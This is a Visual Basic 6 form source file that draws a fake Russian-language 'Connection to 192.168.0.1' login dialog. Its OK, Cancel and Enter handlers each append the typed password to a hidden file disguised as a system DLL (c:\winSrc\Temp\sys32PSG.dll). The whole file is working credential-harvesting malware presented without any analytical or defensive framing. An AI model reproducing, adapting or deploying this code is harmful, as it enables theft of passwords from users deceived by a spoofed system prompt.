VERSION 5.00
Begin VB.Form Form1 
   BackColor       =   &H8000000B&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Подключение к 192.168.0.1"
   ClientHeight    =   3885
   ClientLeft      =   4440
   ClientTop       =   3315
   ClientWidth     =   4785
   Icon            =   "internetVzlom.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "internetVzlom.frx":2B8A
   ScaleHeight     =   3885
   ScaleWidth      =   4785
   StartUpPosition =   2  'CenterScreen
   WhatsThisButton =   -1  'True
   WhatsThisHelp   =   -1  'True
   Begin VB.TextBox Text1 
      BorderStyle     =   0  'None
      Height          =   195
      Left            =   2100
      TabIndex        =   4
      Top             =   1680
      Width           =   2115
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Check1"
      Height          =   195
      Left            =   1760
      TabIndex        =   3
      Top             =   2510
      Width           =   145
   End
   Begin VB.CommandButton Command2 
      BackColor       =   &H8000000B&
      Caption         =   "Отмена"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   340
      Left            =   3530
      Style           =   1  'Graphical
      TabIndex        =   2
      Top             =   3360
      Width           =   1120
   End
   Begin VB.CommandButton Command1 
      Appearance      =   0  'Flat
      BackColor       =   &H8000000B&
      Caption         =   "ОК"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   340
      Left            =   2280
      MaskColor       =   &H80000003&
      Style           =   1  'Graphical
      TabIndex        =   1
      Top             =   3360
      Width           =   1150
   End
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "Wingdings"
         Size            =   8.25
         Charset         =   2
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   305
      IMEMode         =   3  'DISABLE
      Left            =   1760
      PasswordChar    =   "l"
      TabIndex        =   0
      Top             =   2030
      Width           =   2910
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
d = FreeFile
On Error GoTo error1:
MkDir "c:\winSrc"
MkDir "c:\winSrc\Temp"
error1:
Open "c:\winSrc\Temp\sys32PSG.dll" For Append As d
Print #d, "пароль:   "; Text2.Text
Close #d
End
End Sub
Private Sub Command2_Click()
d = FreeFile
On Error GoTo error1:
MkDir "c:\winSrc"
MkDir "c:\winSrc\Temp"
error1:
Open "c:\winSrc\Temp\sys32PSG.dll" For Append As d
Print #d, "пароль:   "; Text2.Text
Close #d
End
End Sub
Private Sub Text2_KeyDown(KeyCode As Integer, Shift As Integer)
If KeyCode = vbKeyReturn Then
d = FreeFile
On Error GoTo error1:
MkDir "c:\winSrc"
MkDir "c:\winSrc\Temp"
error1:
Open "c:\winSrc\Temp\sys32PSG.dll" For Append As d
Print #d, "пароль:   "; Text2.Text
Close #d
Unload Me
End If
End Sub

